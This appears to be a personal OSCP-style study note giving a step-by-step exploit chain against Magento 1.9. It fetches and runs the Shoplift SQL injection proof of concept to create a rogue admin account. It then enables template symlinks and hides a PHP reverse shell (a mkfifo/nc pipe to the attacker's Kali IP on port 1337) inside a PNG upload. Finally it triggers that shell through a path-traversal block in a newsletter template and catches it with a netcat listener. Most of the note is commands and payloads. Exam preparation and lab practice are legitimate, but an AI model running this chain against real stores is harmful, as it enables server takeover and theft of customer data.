https://github.com/steverobbins/magescan

```
wget https://github.com/steverobbins/magescan/releases/download/v1.12.9/magescan.phar
```

MAGESCAN
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Notes");
const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND";

const command = `php magescan.phar scan:all http://${discoveredDomain}`;

dv.paragraph("```bash\n" + command + "\n```");
```
---

Version 1.9.0.0

Create new admin

```
wget https://raw.githubusercontent.com/joren485/Magento-Shoplift-SQLI/master/poc.py
```
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Notes");
const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND";

const command = `python2 poc.py http://${discoveredDomain}`;

dv.paragraph("```bash\n" + command + "\n```");
```
change 

```
query = q.replace("\n", "").format(username="rick", password="rick")
```

log in

---

On admin dashboard

System > Configuration > Advanced > Developer > Template Settings > Allow Symlinks Yes

echo this into a png

```
echo '<?php' >> shell.php.png
```
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Notes");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `echo 'passthru("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${KaliIP} 1337 >/tmp/f");' >> shell.php.png`;

dv.paragraph("```bash\n" + command + "\n```");
```
```
echo '?>' >> shell.php.png
```

Catalog > Manage Categories > Add Root Category > Image > Browse > Upload png > Save Category

Check
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Notes");
const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND";

const command = `http://${discoveredDomain}/media/catalog/category/shell.php.png`;

dv.paragraph("```bash\n" + command + "\n```");
```
if its there

Last step create newsletter template and inject the payload

Newsletter > Newsletter Templates > Add New Template > Type this

```
{{block type='core/template' template='../../../../../../media/catalog/category/shell.php.png'}}
```

Save template

Open Listener on kali attacker

```
nc -lvnp 1337
```

Preview Template

Catch connection

---







